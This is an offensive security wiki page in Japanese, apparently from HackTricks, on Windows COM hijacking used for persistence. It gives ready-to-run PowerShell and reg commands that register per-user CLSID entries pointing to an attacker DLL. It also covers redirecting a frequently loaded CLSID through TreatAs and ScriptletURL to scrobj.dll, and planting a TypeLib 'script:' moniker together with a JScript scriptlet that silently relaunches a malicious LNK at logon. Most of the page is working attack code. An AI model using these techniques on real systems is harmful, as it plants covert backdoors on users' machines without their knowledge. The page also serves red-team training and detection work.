# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

HKCU の値はユーザーによって変更可能なため、**COM Hijacking** は **永続化メカニズム** として利用できます。`procmon` を使うと、まだ存在しない検索された COM レジストリを簡単に見つけられ、攻撃者が作成できるものが分かります。典型的なフィルタ：

- **RegOpenKey** 操作。
- _Result_ が **NAME NOT FOUND** の場合。
- _Path_ が **InprocServer32** で終わる。

ハンティング時の有用なバリエーション：

- 欠落している **`LocalServer32`** キーも探してください。いくつかの COM クラスはプロセス外サーバーであり、DLL の代わりに攻撃者制御の EXE を起動します。
- `InprocServer32` に加えて **`TreatAs`** と **`ScriptletURL`** のレジストリ操作も検索してください。最近の検知コンテンツやマルウェア解析では、これらは通常の COM 登録よりもはるかに稀であり、そのため高シグナルとされています。
- HKCU に登録を複製する際は、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` から正当な **`ThreadingModel`** をコピーしてください。誤ったモデルを使うとアクティベーションが失敗し、ハイジャックが目立ってしまうことが多いです。
- 64-bit システムでは 64-bit と 32-bit のビュー（`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）の両方を確認してください。32-bit アプリケーションは異なる COM 登録を解決する可能性があります。

どの存在しない COM を偽装するか決めたら、次のコマンドを実行します。_数秒ごとに読み込まれる COM を偽装する場合は過剰になり得るので注意してください。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### ハイジャック可能な Task Scheduler の COM コンポーネント

Windows のタスクは Custom Triggers を使って COM オブジェクトを呼び出します。Task Scheduler 経由で実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すれば、例えば **ユーザーがログインするたびに** 実行されるものを選択できます。

次に CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** と HKLM、HKCU 内で検索すると、通常その値は HKCU には存在しないことが多いです。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCU エントリを作成するだけで、ユーザーがログインするたびにあなたの backdoor が起動します。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` はある CLSID を別の CLSID でエミュレートできるようにします。攻撃側の視点では、元の CLSID をそのままにしておき、`scrobj.dll` を指すユーザーごとの二つ目の CLSID を作成し、実際の COM オブジェクトを `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` を使って悪意のあるものにリダイレクトできます。

これは次の場合に有用です:

- ターゲットアプリケーションが既にログオン時またはアプリ起動時に安定した CLSID をインスタンス化している場合
- 元の `InprocServer32` を置き換えるのではなく、レジストリのみでリダイレクトしたい場合
- `ScriptletURL` 値を通じてローカルまたはリモートの `.sct` スクリプトレットを実行したい場合

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
注記:

- `scrobj.dll` は `ScriptletURL` 値を読み取り、参照された `.sct` を実行します。したがって、ペイロードをローカルファイルとして保持するか、HTTP/HTTPS 経由でリモートから取得できます。
- `TreatAs` は、元の COM 登録が HKLM に完全かつ安定して存在する場合に特に便利です。ツリー全体をミラーリングする代わりに、少量のユーザー単位のリダイレクトだけで済むためです。
- 自然なトリガーを待たずに検証する場合、対象クラスが STA アクティベーションをサポートしていれば、`rundll32.exe -sta <ProgID-or-CLSID>` で偽の ProgID/CLSID を手動でインスタンス化できます。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) は COM インターフェイスを定義し、`LoadTypeLib()` によって読み込まれます。COM サーバがインスタンス化されると、OS は関連する TypeLib を `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して読み込むことがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）に置き換えられると、TypeLib が解決される際に Windows は scriptlet を実行します — これにより一般的なコンポーネントが触れられたときに発動するステルスな persistence を得られます。

これは Microsoft Web Browser control に対して観測されており（Internet Explorer、WebBrowser を埋め込むアプリ、さらには `explorer.exe` で頻繁に読み込まれます）。

### 手順 (PowerShell)

1) 高頻度で使用される CLSID が参照する TypeLib (LIBID) を特定します。マルウェアチェーンで頻繁に悪用される例としての CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`（Microsoft Web Browser）
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) ユーザーごとの TypeLib パスをローカルの scriptlet を指すように `script:` モニカーで設定する（管理者権限不要）:
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 最小限の JScript `.sct` を配置して、主要なペイロード（例：初期チェーンで使用される `.lnk`）を再実行させる:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) トリガー – IE を開く、WebBrowser コントロールを埋め込んだアプリケーションを開く、あるいは通常の Explorer の操作でも TypeLib が読み込まれ scriptlet が実行され、ログオン／再起動時にチェーンが再度有効化されます。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
ノート
- 同じ手法は他の頻度の高い COM コンポーネントにも適用できます。必ずまず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を確認してください。
- 64-bit システムでは、64-bit のクライアント向けに `win64` サブキーを設定しても構いません。

## 参考資料

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
